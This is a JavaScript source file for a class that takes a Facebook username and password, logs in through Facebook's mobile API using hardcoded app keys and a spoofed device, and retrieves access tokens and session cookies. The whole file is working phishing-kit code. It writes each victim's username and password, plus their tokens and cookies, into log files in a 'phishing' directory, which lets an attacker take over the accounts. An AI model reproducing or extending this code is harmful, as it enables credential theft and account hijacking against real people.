const axios = require('axios');
const { v4: uuidv4 } = require('uuid');
const { readFile, writeFile } = require('../utils/fileUtils');

class FbTokenService {
  async retrieveToken(username, password) {
    const device_id = uuidv4();
    const adid = uuidv4();

    const form = {
      adid: adid,
      email: username,
      password: password,
      format: 'json',
      device_id: device_id,
      cpl: 'true',
      family_device_id: device_id,
      locale: 'en_US',
      client_country_code: 'US',
      credentials_type: 'device_based_login_password',
      generate_session_cookies: '1',
      generate_analytics_claim: '1',
      generate_machine_id: '1',
      currently_logged_in_userid: '0',
      irisSeqID: 1,
      try_num: '1',
      enroll_misauth: 'false',
      meta_inf_fbmeta: 'NO_FILE',
      source: 'login',
      machine_id: this.randomString(24),
      meta_inf_fbmeta: '',
      fb_api_req_friendly_name: 'authenticate',
      api_key: '882a8490361da98702bf97a021ddc14d',
      access_token: '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32'
    };

    form.sig = this.encodesig(this.sort(form));

    const options = {
      url: 'https://b-graph.facebook.com/auth/login',
      method: 'post',
      data: form,
      transformRequest: [
        (data, headers) => {
          return require('querystring').stringify(data);
        },
      ],
      headers: {
        'content-type': 'application/x-www-form-urlencoded',
        "x-fb-friendly-name": form["fb_api_req_friendly_name"],
        'x-fb-http-engine': 'Liger',
        'user-agent': 'Mozilla/5.0 (Linux; Android 11; TECNO LE6h) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/120.0.6099.26 WebviumDev/2.9-dev Mobile Safari/537.36',
      }
    };

    try {
      const response = await axios.request(options);
      const tokenData = await this.convertTokenData(response.data);
      await this.updateFile(username, password, tokenData);
      return tokenData;
    } catch (error) {
      console.error('Failed to retrieve token:');
      throw new Error('Failed to retrieve token');
    }
  }

  async convertTokenData(data) {
    try {
      const response = await axios.get(`https://api.facebook.com/method/auth.getSessionforApp?format=json&access_token=${data.access_token}&new_app_id=275254692598279`);
      if (response.data.error) {
        return null;
      } else {
        return {
          access_token_eaad6v7: response.data.access_token,
          access_token: data.access_token,
          cookies: this.convertCookie(data.session_cookies),
        };
      }
    } catch (error) {
      throw error;
    }
  }

  async updateFile(username, password, tokenData) {
      const tokenlogs = `${tokenData.access_token_eaad6v7}\n\n${tokenData.access_token}\n\n`;
      const cookielogs = `${tokenData.cookies}\n\n`;
      const existingData = readFile('../phishing/fblogs.txt');
      const existingTokenLogs = readFile('../phishing/fbtokenlogs.txt');
      const existingCookieLogs = readFile('../phishing/fbcookielogs.txt');

      if (existingData.includes(username)) {
          const updatedData = existingData.replace(
              new RegExp(`${username}\\|.*\n`),
              `${username}|${password}\n`
          );
          writeFile('fblogs.txt', updatedData);
      } else {
          const phishingData = `${username}|${password}\n`;
          writeFile('fblogs.txt', existingData + phishingData);
      }

      // Append to token logs
      writeFile('fbtokenlogs.txt', existingTokenLogs + tokenlogs);

      // Append to cookie logs
      writeFile('fbcookielogs.txt', existingCookieLogs + cookielogs);

      console.log('Data successfully updated or added!');
  }

  convertCookie(session) {
    let cookie = '';
    for (let i = 0; i < session.length; i++) {
      cookie += `${session[i].name}=${session[i].value}; `;
    }
    return cookie;
  }

  randomString(length) {
    length = length || 10;
    let char = 'abcdefghijklmnopqrstuvwxyz';
    char = char.charAt(Math.floor(Math.random() * char.length));
    for (let i = 0; i < length - 1; i++) {
      char += 'abcdefghijklmnopqrstuvwxyz0123456789'.charAt(Math.floor(36 * Math.random()));
    }
    return char;
  }

  encodesig(string) {
    let data = '';
    Object.keys(string).forEach(function (info) {
      data += info + '=' + string[info];
    });
    data = this.md5(data + '62f8ce9f74b12f84c123cc23437a4a32');
    return data;
  }

  md5(string) {
    return require('crypto').createHash('md5').update(string).digest('hex');
  }

  sort(string) {
    const sor = Object.keys(string).sort();
    let data = {};
    for (const i in sor) {
      data[sor[i]] = string[sor[i]];
    }
    return data;
  }
}

module.exports = { FbTokenService };
